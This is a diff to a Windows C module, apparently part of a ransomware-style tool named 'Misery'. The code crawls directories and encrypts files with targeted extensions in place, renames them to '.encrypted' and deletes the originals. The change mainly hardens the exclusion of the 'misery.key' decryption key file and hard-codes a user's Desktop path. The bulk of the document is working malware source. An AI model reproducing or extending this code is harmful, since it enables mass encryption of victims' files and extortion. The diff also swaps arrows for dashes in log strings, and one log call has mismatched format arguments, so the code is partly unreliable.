@@ -6,6 +6,63 @@
 #include <shlobj.h>
 #include <inttypes.h>
 
+/*
+ * ===================================================================
+ * FIX: Robust key-file path detection.
+ *
+ * Returns TRUE if the path points to a "misery.key" file.
+ * Checks:
+ *   - Exact match on known absolute paths where the key is saved
+ *   - Any path ending in \misery.key (path-segment match)
+ *   - Relative path "misery.key"
+ *
+ * This is used in THREE places to ensure misery.key is NEVER
+ * encrypted, regardless of where it is saved.
+ * ===================================================================
+ */
+static bool IsKeyFilePath(const char *path) {
+    if (!path || !*path) return false;
+
+    /* Exact absolute paths where SaveKeyFile() writes */
+    static const char *exactPaths[] = {
+        "C:\\Users\\jahan\\OneDrive\\Desktop\\misery.key",
+        NULL
+    };
+    for (int i = 0; exactPaths[i]; i++) {
+        if (_stricmp(path, exactPaths[i]) == 0)
+            return true;
+    }
+
+    size_t len = strlen(path);
+
+    /* Relative path: "misery.key" (no directory component) */
+    if (_stricmp(path, "misery.key") == 0)
+        return true;
+
+    /* Any path ending with \misery.key */
+    if (len >= 12) { /* \ + "misery.key" = 12 chars minimum */
+        /* Check for backslash before misery.key (Windows paths) */
+        if (path[len - 11] == '\\' &&
+            _stricmp(path + len - 10, "misery.key") == 0)
+            return true;
+
+        /* Also catch forward-slash paths (rare on Windows but defensive) */
+        if (path[len - 11] == '/' &&
+            _stricmp(path + len - 10, "misery.key") == 0)
+            return true;
+    }
+
+    /*
+     * Edge case: short 8.3 path variant (e.g., JAHAN~1\Desktop\misery.key)
+     * We cannot enumerate all short paths, but the filename match above
+     * (\misery.key ending) already catches the vast majority of cases.
+     * For the specific Desktop location listed in exactPaths[], the
+     * long-path exact match is sufficient for this project's target dirs.
+     */
+
+    return false;
+}
+
 static bool IsTargetExtension(const char *path);
 
 /* Skip list — system dirs */
@@ -45,7 +102,7 @@ static const char *g_ext[] = {
     NULL
 };
 
-/* ── Internal context ── */
+/* — Internal context — */
 struct FILEOPS_CTX {
     FILEOPS_CONFIG    config;
     FILEOPS_STATS     stats;
@@ -66,7 +123,7 @@ struct FILEOPS_CTX {
     volatile LONG     shutdownFlag;
 };
 
-/* ── Worker thread ── */
+/* — Worker thread — */
 static DWORD WINAPI WorkerThread(LPVOID lpParam) {
     FILEOPS_CTX *ctx = (FILEOPS_CTX *)lpParam;
     const bool decryptMode = ctx->config.decryptMode;
@@ -107,7 +164,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             continue;
         }
 
-        /* ── Encrypt or Decrypt ── */
+        /* — Encrypt or Decrypt — */
         HANDLE hFile = INVALID_HANDLE_VALUE;
         BYTE  *buf   = NULL;
         BYTE  *plaintext = NULL;
@@ -115,10 +172,15 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         DWORD  fs = 0;
         bool   success = false;
 
-        /* ── FIX: Stronger key file exclusion — use strstr to catch at ANY path depth ── */
+        /*
+         * FIX: Use IsKeyFilePath() for robust exclusion.
+         * This replaces the old strstr() check which could miss
+         * short-path variants or case variations.
+         */
         if (!decryptMode) {
-            if (strstr(narrowPath, "misery.key") != NULL) {
-                MiseryLog(MISERY_LOG_INFO, "FileOps: Worker skipping key file: %s", narrowPath);
+            if (IsKeyFilePath(narrowPath)) {
+                MiseryLog(MISERY_LOG_INFO,
+                          "FileOps: Worker skipping key file: %s", narrowPath);
                 success = true;
                 EnterCriticalSection(&ctx->statsLock);
                 ctx->stats.filesSucceeded++;
@@ -156,9 +218,9 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         }
 
         if (decryptMode) {
-            /* ══════════════════════════════════════════════════
+            /* ═══════════════════════════════════════════════════════════
              * DECRYPT PATH
-             * ══════════════════════════════════════════════════ */
+             * ═══════════════════════════════════════════════════════════ */
             bufSize = fs;
             buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -179,7 +241,8 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             plaintext = (BYTE *)VirtualAlloc(NULL, maxPlainCap,
                                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if (!plaintext) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) plaintext failed (err: %lu)",
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: VirtualAlloc(%lu) plaintext failed (err: %lu)",
                           maxPlainCap, GetLastError());
                 goto worker_done;
             }
@@ -189,7 +252,8 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
                                               buf, fs,
                                               plaintext, &decLen, maxPlainCap);
             if (cerr != CRYPTO_SUCCESS) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: DecryptBuffer failed for %s: %s (code=%d)",
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: DecryptBuffer failed for %s: %s (code=%d)",
                           narrowPath, GetErrorString(cerr), cerr);
                 goto worker_done;
             }
@@ -207,7 +271,8 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
                 }
             }
             if (!encPos) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot find .encrypted in path: %s", narrowPath);
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: Cannot find .encrypted in path: %s", narrowPath);
                 goto worker_done;
             }
             *encPos = '\0';
@@ -220,7 +285,8 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
                                         NULL, CREATE_ALWAYS,
                                         FILE_ATTRIBUTE_NORMAL, NULL);
             if (hWrite == INVALID_HANDLE_VALUE) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot create tmp %s (err: %lu)",
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: Cannot create tmp %s (err: %lu)",
                           tmpPath, GetLastError());
                 goto worker_done;
             }
@@ -228,16 +294,18 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             BOOL writeOk = WriteFile(hWrite, plaintext, decLen, &wr, NULL);
             CloseHandle(hWrite);
             if (!writeOk || wr != decLen) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: WriteFile failed for %s (err: %lu)",
-                          tmpPath, GetLastError());
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: WriteFile failed for %s (wrote %lu/%lu, err: %lu)",
+                          tmpPath, wr, decLen, GetLastError());
                 DeleteFileA(tmpPath);
                 goto worker_done;
             }
 
-            /* Rename .tmp → original (stripped name) */
+            /* Rename .tmp — original (stripped name) */
             if (!MoveFileExA(tmpPath, origPath,
                              MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: MoveFileEx %s → %s failed (err: %lu)",
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: MoveFileEx %s — %s failed (err: %lu)",
                           tmpPath, origPath, GetLastError());
                 DeleteFileA(tmpPath);
                 goto worker_done;
@@ -247,7 +315,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             DeleteFileA(narrowPath);
 
             success = true;
-            MiseryLog(MISERY_LOG_INFO, "FileOps: Decrypted %s (%lu bytes) → %s",
+            MiseryLog(MISERY_LOG_INFO, "FileOps: Decrypted %s (%lu bytes) — %s",
                       narrowPath, fs, origPath);
             EnterCriticalSection(&ctx->statsLock);
             ctx->stats.bytesProcessed += fs;
@@ -255,14 +323,15 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             LeaveCriticalSection(&ctx->statsLock);
 
         } else {
-            /* ══════════════════════════════════════════════════
+            /* ═══════════════════════════════════════════════════════════
              * ENCRYPT PATH
-             * ══════════════════════════════════════════════════ */
+             * ═══════════════════════════════════════════════════════════ */
             bufSize = CRYPTO_REQUIRED_CAPACITY(fs);
             buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if (!buf) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) failed (err: %lu)",
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: VirtualAlloc(%lu) failed (err: %lu)",
                           bufSize, GetLastError());
                 goto worker_done;
             }
@@ -270,14 +339,16 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             plaintext = (BYTE *)VirtualAlloc(NULL, fs,
                                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if (!plaintext) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) plaintext failed (err: %lu)",
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: VirtualAlloc(%lu) plaintext failed (err: %lu)",
                           fs, GetLastError());
                 goto worker_done;
             }
 
             DWORD rd = 0;
             if (!ReadFile(hFile, plaintext, fs, &rd, NULL) || rd != fs) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: ReadFile failed for %s (err: %lu)",
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: ReadFile failed for %s (err: %lu)",
                           narrowPath, GetLastError());
                 goto worker_done;
             }
@@ -294,7 +365,8 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             plaintext = NULL;
 
             if (cerr != CRYPTO_SUCCESS) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: EncryptBuffer failed for %s: %s (code=%d)",
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: EncryptBuffer failed for %s: %s (code=%d)",
                           narrowPath, GetErrorString(cerr), cerr);
                 goto worker_done;
             }
@@ -307,7 +379,8 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
                                         NULL, CREATE_ALWAYS,
                                         FILE_ATTRIBUTE_NORMAL, NULL);
             if (hWrite == INVALID_HANDLE_VALUE) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot create tmp %s (err: %lu)",
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: Cannot create tmp %s (err: %lu)",
                           tmpPath, GetLastError());
                 goto worker_done;
             }
@@ -315,33 +388,36 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             BOOL writeOk = WriteFile(hWrite, buf, encLen, &wr, NULL);
             CloseHandle(hWrite);
             if (!writeOk || wr != encLen) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: WriteFile failed (wrote %lu/%lu, err: %lu)",
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: WriteFile failed (wrote %lu/%lu, err: %lu)",
                           tmpPath, wr, encLen, GetLastError());
                 DeleteFileA(tmpPath);
                 goto worker_done;
             }
 
-            /* Atomic rename: .tmp → original (overwrite with encrypted data) */
+            /* Atomic rename: .tmp — original (overwrite with encrypted data) */
             if (!MoveFileExA(tmpPath, narrowPath,
                              MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: MoveFileEx %s → %s failed (err: %lu)",
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: MoveFileEx %s — %s failed (err: %lu)",
                           tmpPath, narrowPath, GetLastError());
                 DeleteFileA(tmpPath);
                 goto worker_done;
             }
 
-            /* Rename original → original.encrypted */
+            /* Rename original — original.encrypted */
             char encPath[FILEOPS_MAX_PATH];
             snprintf(encPath, sizeof(encPath), "%s%s", narrowPath, ENC_EXT);
             if (!MoveFileExA(narrowPath, encPath,
                              MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: MoveFileEx %s → %s failed (err: %lu)",
+                MiseryLog(MISERY_LOG_WARN,
+                          "FileOps: MoveFileEx %s — %s failed (err: %lu)",
                           narrowPath, encPath, GetLastError());
                 goto worker_done;
             }
 
             success = true;
-            MiseryLog(MISERY_LOG_INFO, "FileOps: Encrypted %s (%lu bytes) → %s",
+            MiseryLog(MISERY_LOG_INFO, "FileOps: Encrypted %s (%lu bytes) — %s",
                       narrowPath, fs, encPath);
             EnterCriticalSection(&ctx->statsLock);
             ctx->stats.bytesProcessed += fs;
@@ -357,7 +433,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             LeaveCriticalSection(&ctx->statsLock);
         }
 
-        /* ── Safe cleanup — all pointers check for NULL before freeing ── */
+        /* — Safe cleanup — all pointers check for NULL before freeing — */
         if (buf) {
             SecureZeroMemory(buf, bufSize);
             VirtualFree(buf, 0, MEM_RELEASE);
@@ -378,7 +454,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
     return 0;
 }
 
-/* ── Enqueue ── */
+/* — Enqueue — */
 static void EnqueueFile(FILEOPS_CTX *ctx, const WCHAR *fullPath) {
     if (!ctx || !fullPath) return;
     size_t pathBytes = (wcslen(fullPath) + 1) * sizeof(WCHAR);
@@ -396,7 +472,7 @@ static void EnqueueFile(FILEOPS_CTX *ctx, const WCHAR *fullPath) {
     LeaveCriticalSection(&ctx->queueLock);
 }
 
-/* ── Traverse ── */
+/* — Traverse — */
 static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
     if (depth > MAX_DEPTH) return;
     if (ctx->config.pfnShouldSkip && ctx->config.pfnShouldSkip(dir)) return;
@@ -431,9 +507,9 @@ static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
                 continue;
 
             if (ctx->config.decryptMode) {
-                /* ══════════════════════════════════════════
+                /* ═══════════════════════════════════════════════════════
                  * DECRYPT TRAVERSE: only .encrypted files
-                 * ══════════════════════════════════════════ */
+                 * ═══════════════════════════════════════════════════════ */
                 const char *encPos = NULL;
                 for (const char *p = narrow; *p; p++) {
                     if (*p == '.' && _strnicmp(p, ENC_EXT, ENC_EXT_LEN) == 0)
@@ -450,7 +526,8 @@ static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
                 *ep = '\0';
 
                 if (GetFileAttributesA(origPath) != INVALID_FILE_ATTRIBUTES) {
-                    MiseryLog(MISERY_LOG_INFO, "FileOps: Skipping (already decrypted): %s", narrow);
+                    MiseryLog(MISERY_LOG_INFO,
+                              "FileOps: Skipping (already decrypted): %s", narrow);
                     continue;
                 }
 
@@ -458,9 +535,16 @@ static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
                 EnqueueFile(ctx, full);
 
             } else {
-                /* ── FIX: Use strstr to catch misery.key at ANY path depth ── */
-                if (strstr(narrow, "misery.key") != NULL) {
-                    MiseryLog(MISERY_LOG_INFO, "FileOps: Skipping key file: %s", narrow);
+                /*
+                 * ENCRYPT TRAVERSE
+                 *
+                 * FIX: Use IsKeyFilePath() for robust exclusion.
+                 * This replaces the old strstr() check which could fail
+                 * on short-path variants.
+                 */
+                if (IsKeyFilePath(narrow)) {
+                    MiseryLog(MISERY_LOG_INFO,
+                              "FileOps: Skipping key file during traverse: %s", narrow);
                     continue;
                 }
 
@@ -479,9 +563,9 @@ static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
     FindClose(hFind);
 }
 
-/* ═══════════════════════════════════════════════════════════════
+/* ═══════════════════════════════════════════════════════════════════════
  * PUBLIC API
- * ═══════════════════════════════════════════════════════════════ */
+ * ═══════════════════════════════════════════════════════════════════════ */
 
 FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
     FILEOPS_CTX *ctx = (FILEOPS_CTX *)
@@ -609,12 +693,22 @@ bool FileOps_DefaultShouldSkip(const WCHAR* path) {
     return false;
 }
 
-/* ── FIX: Hard-exclude misery.key at the extension check level ── */
+/*
+ * FIX: IsTargetExtension() — returns true if the file extension
+ * matches one of the target encryption extensions.
+ *
+ * Key file exclusion: uses IsKeyFilePath() for robust detection,
+ * replacing the old strstr() check.
+ */
 static bool IsTargetExtension(const char* path) {
     if (!path) return false;
 
-    /* FIX: Never encrypt the key file, regardless of where it sits */
-    if (strstr(path, "misery.key") != NULL) return false;
+    /*
+     * FIX: Never encrypt the key file, regardless of where it sits.
+     * Uses IsKeyFilePath() for robust detection (exact path, filename,
+     * path-segment match).
+     */
+    if (IsKeyFilePath(path)) return false;
 
     const char *dot = strrchr(path, '.');
     if (!dot) return false;
